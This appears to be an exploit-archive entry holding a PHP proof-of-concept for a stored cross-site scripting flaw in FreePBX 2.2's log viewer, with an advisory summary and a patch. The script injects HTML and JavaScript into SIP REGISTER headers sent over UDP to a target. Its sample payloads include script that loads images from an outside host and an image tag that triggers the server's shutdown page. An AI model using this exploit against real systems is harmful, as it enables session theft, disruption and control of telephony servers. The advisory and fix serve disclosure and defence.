@@ -1,0 +1,204 @@
+source: http://www.securityfocus.com/bid/23575/info
+
+FreePBX is prone to multiple HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input data before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code may be executed in the context of the affected web application, potentially allowing the attacker to steal cookie-based authentication credentials, control how the web application is displayed to the user, or manipulate the underlying PBX application; other attacks are also possible.
+
+FreePBX 2.2. series is vulnerable to these issues. 
+
+#!/usr/bin/php
+<?php
+/*
+
+      \  |      |   |           |                   |  _)
+     |\/ |  _ \ __| __ \  |   | |\ \  /  _` | __ \  __| | __ \   _` |
+     |   |  __/ |   | | | |   | | `  <  (   | |   | |   | |   | (   |
+    _|  _|\___|\__|_| |_|\__, |_| _/\_\\__,_|_|  _|\__|_|_|  _|\__,_|
+                     ____/
+    ___ \  ___|   /                     Methylxantina 256mg
+       ) | __ \   _ \  __ `__ \   _` |  http://xenomuta.blogspot.com
+      __/    ) | (   | |   |   | (   |
+    _____|____/ \___/ _|  _|  _|\__, |  freePBX 2.2.x full-log XSS PoC
+                                |___/   by XenoMuta
+<xenomuta@phreaker.net <mailto:xenomuta@phreaker.net>>
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+ISSUE:
+SIP protocol's fields such as From, To, Call-ID, User-Agent (and many
+others)
+can carry html tags, wich are shown unfiltered by the Asterisk Log File
+tools
+located at http://<freepbx
+root>/admin/modules/logfiles/asterisk-full-log.php
+resulting in malicios HMTL or Javascript code injection.
+
+IMPACT:
+Server shutdown/restart, PBX control and Possible remote code execution
+through
+amportal options. Just about anything you can code in Javascript.
+* Note that the amportal's admin will only see the last 2000 lines of
+full log.
+  for wich an attaker might call the admin asking for support at the time of
+exploitation. This doesn't require authentication or valid credentials >:)
+
+WARNING:
+* Do this on your own risk. Intended for research and educational
+purposes ONLY.
+* Neither the author or Methylxantine 256mg are accountable for your
+actions.
+* Running this will taint your log file. Make sure you clean it after a
+test.
+
+FIX:
+Here is a way to fix the problem.
+
+[root@asterisk1 ~]# cd /var/www/html/admin/modules/logfiles
+[root@asterisk1 logfiles]# cat<<EOF|patch
+*** asterisk-full-log.php       2007-04-18 12:51:10.000000000 -0400
+--- asterisk-full-log.php.fixed 2007-04-18 12:51:18.000000000 -0400
+***************
+*** 10,16 ****
+  <hr>
+  <br>
+  <?
+! echo system ('tail --line=2000 /var/log/asterisk/full | sed -e
+"s/$/<br>/"');
+  ?>
+
+  </body>
+--- 10,16 ----
+  <hr>
+  <br>
+  <?
+! echo system ('tail --line=2000 /var/log/asterisk/full | sed -e
+"s/</\</;s/>/\>/" | sed -e "s/$/<br>/"');
+  ?>
+
+  </body>
+EOF
+
+
+PAYOLA AND GREETS:
+:)
+gr33tz to:
+- God, for being so faithfull.
+- Lili, por la paciencia nocturna y por tu amor
+- the Asterisk team and the freePBX team, for such an EXCELENT product
+- EMRA, por la fragancia
+- Leo, te di Luz
+
+
+*/
+
+print "\x1bc\n\x1b[1m\x1b[30m\x1b[47m";
+print "
+            \n";
+print "
+            \r";
+print "      \\  |      |   |           |                   |  _)
+    \n";
+print "
+            \r";
+print "     |\\/ |  _ \\ __| __ \\  |   | |\\ \\  /  _` | __ \\  __| |
+__ \\   _` |\n";
+print "
+            \r";
+print "     |   |  __/ |   | | | |   | | `  <  (   | |   | |   | |   |
+(   |\n";
+print "
+            \r";
+print "    _|  _|\\___|\\__|_| |_|\\__, |_| _/\\_\\\\__,_|_|
+_|\\__|_|_|  _|\\__,_|\n";
+print "
+            \r";
+print "                         ____/
+   \n";
+print "
+            \r";
+print "    ___ \\  ___|   /                     Methylxantina 256mg\n";
+print "
+            \r";
+print "       ) | __ \\   _ \\  __ `__ \\   _` |
+http://xenomuta.blogspot.com\n";
+print "
+            \r";
+print "      __/    ) | (   | |   |   | (   | \n";
+print "
+            \r";
+print "    _____|____/ \\___/ _|  _|  _|\\__, |  freePBX 2.2.x full-log
+XSS PoC\n";
+print "
+            \r";
+print "                                |___/   by XenoMuta
+<xenomuta@phreaker.net <mailto:xenomuta@phreaker.net>>\n";
+print "
+            \n\x1b[0m";
+
+
+//COMMENT ME TO PROCEED
+//die("\x1b[31mWe urge you to read the code first. Comment this line to
+proceed.\n\x1b[0m");
+if($argc<2) die("\nUsage: $argv[0] <sip proxy> [custom payload]\n\n");
+$sipp=$argv[1];
+
+
+if($argc<3){
+//SOME SAMPLE PAYLOADS FOR YOUR PLEASURE
+
+//Execute external Payload (this one only possible with Call-id payload)
+$payload="<script>var body=document.getElementsByTagName('body');var
+fly= new Image(), ofly=new Image(), ifly=new
+Image();ifly.src='http://xenmut.100webspace.net/fly2.png';ofly.src='http://xenmut.100webspace.net/fly1.png';ofly.onload=eval('var
+mv=setInterval(\'move()\',10);');fly.setAttribute('id','fly');fly.style.position='absolute;';fly.style.left='300';fly.style.top='100';body[0].appendChild(f
+ly);var
+ang,s=2,xx,yy,cal,pi=3.1415926535,ala=true;function
+calma(){s=2;clearInterval(cal);}function move() {var
+x,y;x=(s*(Math.sin(ang)));y=(s*(Math.cos(ang)));ala=!ala;if(ala)
+fly.src=ifly.src;else
+fly.src=ofly.src;if(Math.round(100*Math.random())>96)ang+=ala?5:-5;if((xx+x>1024)||(xx+x<0)||(yy+y>800)||(yy+y<0)){ang=Math.round(360*Math.random());}else{
+xx+=x;yy+=y;}fly.style.left=xx+'px';fly.style.top=yy+'px';}function
+main(){ang=Math.round(360*Math.random());xx=620;yy=400;fly.onmouseover=function(){s=10;ang=Math.round(360*Math.random());clearInterval(cal);cal=setInterval
+('calma()',500);}}main();</script>";
+
+//Space Invader (this one only possible with Call-id payload)
+//$payload="<img width=900
+src=http://www.i-marco.nl/weblog/images/SpaceInvader.jpg>";
+
+// Server shutdown Payload
+/*
+.oOOOo.     Oo    O       o oOoOOoOOo ooOoOOo  .oOOOo.  o.     O
+.O     o    o  O   o       O     o        O    .O     o. Oo     o
+o          O    o  O       o     o        o    O       o O O    O
+o         oOooOoOo o       o     O        O    o       O O  o   o
+o         o      O o       O     o        o    O       o O   o  O
+O         O      o O       O     O        O    o       O o    O O
+`o     .o o      O `o     Oo     O        O    `o     O' o     Oo
+`OoooO'  O.     O  `OoooO'O     o'    ooOOoOo  `OoooO'  O     `o
+*/
+//$payload='<img src="../sysstatus/shutdown.php">';
+} else {
+$payload=$argv[2];
+}
+
+$ext=1234;
+$agent="SJphone v1.0";
+$udp=fsockopen("udp://$sipp",5060);
+$seq=rand(10000,99900);
+$packet = "REGISTER sip:$sipp SIP/2.0\n".
+"Via: SIP/2.0/UDP $sipp:5060;rport;branch=z9hG4bK12345\n".
+"From: $payload\n".
+"To: $payload\n".
+"Contact: \"$ext\" <sip:$ext@$sipp:5060>\n".
+"Call-ID: 12345@$sipp\n".
+"CSeq: 12345 REGISTER\n".
+"Expires: 1800\n".
+"Max-Forwards: 70\n".
+"User-Agent: $agent\n".
+"Content-Length: 0\n\n";
+fputs($udp,$packet);
+fclose($udp);
+die("\nPAYLOAD SENT:\n$payload\n");
+
+?>
+
